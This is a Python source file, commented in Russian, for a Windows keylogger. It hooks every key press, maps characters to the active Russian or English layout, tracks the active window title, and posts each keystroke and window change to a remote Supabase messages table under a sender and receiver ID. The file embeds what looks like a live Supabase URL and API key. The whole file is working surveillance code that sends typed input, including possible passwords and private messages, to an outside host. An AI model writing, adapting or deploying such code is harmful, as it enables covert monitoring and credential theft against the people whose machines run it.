import keyboard
import requests
import time
import threading
from datetime import datetime, timezone
import ctypes
import win32gui

# Supabase конфиг
SUPABASE_URL = "https://fwpsnsxsjlcgolqcqzku.supabase.co"
SUPABASE_KEY = "sb_publishable_OkAn3rM405wIeQQK1g5WUQ_-F4x9yh8"

SENDER_ID = "user44"
RECEIVER_ID = "user1234"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
}

# Устанавливаем задержку для pyautogui
import pyautogui
pyautogui.PAUSE = 0.01

# Словарь для конвертации английских букв в русские (при RU-раскладке)
eng_to_rus = {
    'q': 'й', 'w': 'ц', 'e': 'у', 'r': 'к', 't': 'е', 'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з',
    'a': 'ф', 's': 'ы', 'd': 'в', 'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л', 'l': 'д',
    'z': 'я', 'x': 'ч', 'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь',
    '[': 'х', ']': 'ъ', ';': 'ж', "'": 'э', ',': 'б', '.': 'ю', '/': '.',
    'Q': 'Й', 'W': 'Ц', 'E': 'У', 'R': 'К', 'T': 'Е', 'Y': 'Н', 'U': 'Г', 'I': 'Ш', 'O': 'Щ', 'P': 'З',
    'A': 'Ф', 'S': 'Ы', 'D': 'В', 'F': 'А', 'G': 'П', 'H': 'Р', 'J': 'О', 'K': 'Л', 'L': 'Д',
    'Z': 'Я', 'X': 'Ч', 'C': 'С', 'V': 'М', 'B': 'И', 'N': 'Т', 'M': 'Ь',
    '[': 'Х', ']': 'Ъ', ';': 'Ж', "'": 'Э', ',': 'Б', '.': 'Ю', '/': ','
}

# Словарь для конвертации русских букв в английские (при EN-раскладке)
rus_to_eng = {v: k for k, v in eng_to_rus.items()}

# Список служебных клавиш, которые нужно игнорировать
IGNORED_KEYS = {
    'shift', 'shift_r', 'shift_l', 'capslock', 'caps lock', 'win', 'win_r', 'win_l',
    'left windows', 'right windows', 'alt', 'alt_r', 'alt_l', 'ctrl', 'ctrl_r', 'ctrl_l',
    'tab', 'esc', 'enter', 'backspace', 'space', 'left', 'right', 'up', 'down',
    'printscreen', 'scrolllock', 'pause', 'insert', 'delete', 'home', 'end', 'pageup',
    'pagedown', 'numlock', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
}

ADDITIONAL_IGNORED_KEYS = {
    'left ctrl', 'right ctrl', 'left shift', 'right shift',
    'left win', 'right win', 'left alt', 'right alt'
}

IGNORED_KEYS.update(ADDITIONAL_IGNORED_KEYS)

stop_monitoring = False
stop_heartbeat = threading.Event()


def heartbeat():
    """Создаёт или обновляет presence для user44."""
    payload = {
        "id": SENDER_ID,
        "name": SENDER_ID,
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }

    try:
        response = requests.post(
            f"{SUPABASE_URL}/rest/v1/presence?on_conflict=id",
            headers={**HEADERS, "Prefer": "resolution=merge-duplicates"},
            json=payload,
            timeout=10,
        )
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Ошибка обновления presence: {e}")


def heartbeat_loop():
    """Обновляет статус онлайн каждые 15 секунд."""
    while not stop_heartbeat.is_set():
        try:
            heartbeat()
        except Exception as e:
            print(f"Ошибка в heartbeat_loop: {e}")

        stop_heartbeat.wait(15)


def send_message(content):
    """Отправляет сообщение в Supabase."""
    payload = {
        "sender_id": SENDER_ID,
        "receiver_id": RECEIVER_ID,
        "content": content,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }

    try:
        response = requests.post(
            f"{SUPABASE_URL}/rest/v1/messages",
            headers=HEADERS,
            json=payload,
            timeout=10,
        )

        if response.status_code not in (200, 201):
            print(f"Ошибка отправки {response.status_code}: {response.text}")
            return False

        return True
    except requests.RequestException as e:
        print(f"Ошибка подключения при отправке сообщения: {e}")
        return False


def get_current_layout():
    """Определяет текущую раскладку клавиатуры."""
    try:
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        klid = user32.GetKeyboardLayout(thread_id)
        layout = klid & 0xFFFF
        return "RU" if layout == 0x419 else "EN" if layout == 0x409 else "UNKNOWN"
    except:
        return "UNKNOWN"


def get_active_window_title():
    """Получает название активного окна."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd) or "Unknown Window"
    except:
        return "Unknown Window"


def on_key_press(event):
    """Обработчик нажатия клавиши. Отправляет в Supabase."""
    current_layout = get_current_layout()
    if current_layout in ["RU", "EN"]:
        try:
            if event.name is None:
                return

            char = event.name.lower()
            if char in IGNORED_KEYS:
                return

            if char:
                if current_layout == "RU" and char in eng_to_rus:
                    char = eng_to_rus[char]
                elif current_layout == "EN" and char in rus_to_eng:
                    char = rus_to_eng[char]

                timestamp = datetime.now().strftime("%H:%M:%S")
                message_content = f"[{timestamp}] [{current_layout}] {char}"
                
                # Отправляем в Supabase
                if send_message(message_content):
                    print(f"Отправлено: {message_content}")
                else:
                    print(f"Не удалось отправить: {message_content}")

        except Exception as e:
            print(f"Ошибка при обработке клавиши: {e}")


def log_active_windows():
    """Логирует смену активного окна."""
    last_window = None
    while not stop_monitoring:
        try:
            current_window = get_active_window_title()
            if current_window != last_window:
                timestamp = datetime.now().strftime("%H:%M:%S")
                message_content = f"[{timestamp}] WINDOW: {current_window}"
                
                if send_message(message_content):
                    print(f"Отправлено: {message_content}")
                else:
                    print(f"Не удалось отправить: {message_content}")
                
                last_window = current_window
            time.sleep(0.5)
        except Exception as e:
            print(f"Ошибка при логировании окон: {e}")
            time.sleep(1)


def main():
    global stop_monitoring

    print("Скрипт запущен. Нажмите Ctrl+C для остановки.")
    print(f"Отправитель: {SENDER_ID}")
    print(f"Получатель: {RECEIVER_ID}")
    print("-" * 50)

    # Запускаем heartbeat
    try:
        heartbeat()
        thread = threading.Thread(target=heartbeat_loop, daemon=True)
        thread.start()
    except Exception as e:
        print(f"Не удалось инициализировать presence: {e}")
        return

    # Запускаем логирование окон
    window_logger = threading.Thread(target=log_active_windows, daemon=True)
    window_logger.start()

    # Запускаем слушание клавиш
    keyboard.on_press(on_key_press)

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nСкрипт остановлен пользователем.")
        stop_monitoring = True
        stop_heartbeat.set()
        
        # Отправляем финальное сообщение
        final_message = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] === Конец записи ==="
        send_message(final_message)


if __name__ == "__main__":
    try:
        import keyboard
        import requests
        import pyautogui
        import win32gui
    except ImportError as e:
        print(f"Ошибка: Установите библиотеки: pip install keyboard requests pyautogui pywin32")
        exit(1)

    main()
